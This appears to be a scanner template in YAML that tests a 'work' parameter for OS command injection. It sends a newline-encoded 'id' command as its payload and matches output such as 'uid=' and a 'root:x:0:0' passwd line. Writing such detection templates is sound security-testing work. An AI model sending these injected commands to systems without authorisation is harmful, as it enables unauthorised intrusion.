id: cmdi6-0449
name: 'Shell injection in work'
severity: critical
type: active
tags:
  - cmdi
  - injection
  - rce
description: 'OS command runs via work'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      work:
        - '%0aid'
    matchers:
      - type: word
        part: body
        words:
          - 'uid='
          - 'gid='
          - 'root:x:0:0'
          - 'www-data'
